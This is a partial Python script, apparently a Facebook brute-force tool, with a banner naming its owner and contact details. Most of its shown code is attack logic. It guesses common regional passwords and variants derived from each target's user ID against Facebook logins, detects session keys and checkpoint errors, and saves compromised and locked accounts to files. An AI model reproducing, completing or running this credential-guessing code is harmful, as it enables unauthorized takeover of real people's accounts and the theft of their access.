...
VP   V8P  `Y88P'   `Y88P'  Y8888P'         {green}(XB){white}  """)                                                                                  
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner    : BIGRA MAHAR ")
    print(f" {white}{green}[~]{white} Facebook : Bigra Mahar ")
    print(f" {white}{green}[~]{white} Tool     : Multi Brute Force Facebook ")
    print(f" {white}{green}[~]{white} Github   : https://github.com/Hammadb6/Hammadb6.git ")
    print(f" {white}{green}[~]{white} Whatsapp : 0319********** ")
    print(f" {white}{green}[~]{white} Status   : {green}Free ")
    print(f" {white}{green}[~]{white} Version  : 3.1 ")
    print(50*'-')
...
def random_number():
    ...
    pwx = ['baloch1234','jani12345','first7digit','last7digit','first6digit,''last6digit','fullnumber','khankhan','khan12345','khan123','baloch123','khan1122','baloch','kingkhan','afghanistan','pakistan','786786','full_number','pak12345']
...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}MR-NOOB{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    print(f'\r{green}[MRNOOB-OK] {uidX} | {pw} {white}')
                    open('/sdcard/MRNOOB-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[NOOB-CP] {uid}     | {pw} {white}')
                    open('/sdcard/NOOB-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r{green}[MRNOOB-OK] {uid} | {pw} {white}')
                    open('/sdcard/MRNOOB-OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
            elif responce_json['error']['code'] == 405:
                #uid = responce_json['error']['uid']
                if uid not in cps:
                    print(f'\r{rad}[MRNOOB-CP] {uid}     | {pw} {white}')
                    open('/sdcard/MRNOOB-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uidX)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
